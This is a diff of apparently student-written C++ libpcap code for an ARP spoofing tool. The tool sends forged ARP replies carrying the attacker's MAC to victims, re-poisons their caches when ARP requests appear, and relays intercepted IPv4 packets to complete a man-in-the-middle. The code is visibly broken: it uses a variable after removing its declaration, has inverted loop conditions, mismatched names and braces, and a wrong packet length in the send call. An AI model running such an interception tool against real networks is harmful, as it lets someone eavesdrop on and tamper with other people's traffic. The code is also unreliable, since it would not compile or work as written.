@@ -225,24 +225,45 @@ int main(int argc, char* argv[]) {
     const u_char* packet;
     
     while (true) {
-        int res = pcap_next_ex(pcap, &header, &packet);
+        int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
             break;
         }
-
-        EthHdr* ethH = (struct EthHdr*)packet;
-        ArpHdr* arpH = (ArpHdr*)(packet_sizeof(EthHdr));
-
         //classify the case -> hmmm.... yes! 
         //but .. ... i can't.. ....
-
-        for(auto& a : victimPairs) {
+        
+        EthHdr* resPacket = (EthHdr*)packet;
+		
+		if(ethH->dmac() == Mac::broadcastMac() || ethH->smac() != myMac) {
             for (int i = 0; pair < i; i++) {
-                sendArpReply(pcap, myMac, targetIp[i], mapMac.find(a.senderIp[i])->second, a.senderIp[i]);
+                    sendArpReply(handle, myMac, targetIp[i], mapMac.find(mapMac.senderIp[i])->second, mapMac.senderIp[i]);
+                }
             }
         }
+        else continue;
+
+        if (resPacket->type() == EthHdr::Arp){
+            ArpHdr* resArpPacket = (ArpHdr*)(packet + sizeof(EthHdr));
+            for (int i = 0; pair < i; i++) {
+                if(resArpPacket->tip()==senderip[i]&&resArpPacket->sip()==targetip[i]) sendArpReply(handle, myMac, targetIp[i], mapMac.find(mapMac.senderIp[i])->second, mapMac.senderIp[i]);
+                else if (resArpPacket->sip()==senderip[i]&&resArpPacket->tsip()==targetip[i]) sendArpReply(handle, myMac, targetIp[i], mapMac.find(mapMac.senderIp[i])->second, mapMac.senderIp[i]);
+                else continue;
+            }
+        }
+        else continue;
+
+        IPv4Header = (struct IPv4Hdr*)(packet + sizeof(struct EthHdr));
+        
+	for(int i = 0; i<pair; i++){
+	    if(IPv4Header->ip_dst == mapMac.targetIP) {
+         	EthHeader->smac_ = myMAC;
+            	EthHeader->dmac_ = mapMac.targetMAC;
+
+            	pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(header->len));
+            }
+	}
     }
 
 
